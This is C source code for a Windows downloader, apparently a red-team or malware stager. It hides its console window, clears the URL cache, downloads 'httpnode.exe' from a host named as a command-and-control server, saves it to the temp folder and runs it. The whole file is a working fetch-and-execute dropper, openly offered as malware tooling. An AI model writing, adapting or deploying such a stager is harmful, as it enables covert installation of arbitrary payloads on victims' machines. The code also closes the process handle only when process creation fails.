/****************************
 *  A simple exe that retrieves
 *  a payload from a predefined
 *  http endpoint, saves it in
 *  a temp dir, and creates a 
 *  process for the payload.
 * **************************/

#include <urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <wininet.h>
#include <fileapi.h>
#include <shlwapi.h>

int _tmain(int argc, _TCHAR *argv[]){
    FreeConsole();

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    const wchar_t* URL = L"https://c2.stephanschmidt.dev/httpnode";
    const wchar_t* malName= L"httpnode.exe";
    wchar_t buffer[MAX_PATH];
    PathCombineW(buffer, tempPath, malName );

    STARTUPINFOW si;
	PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    DeleteUrlCacheEntryW(URL);

    HRESULT status = URLDownloadToFileW(NULL, URL, buffer, 0, NULL);
    if (SUCCEEDED(status)){
        if (!CreateProcessW(NULL, (LPWSTR) buffer, NULL, NULL, FALSE, 0, NULL, NULL,  &si, &pi)){
            CloseHandle(pi.hProcess);
        }
    }

    return 0;
}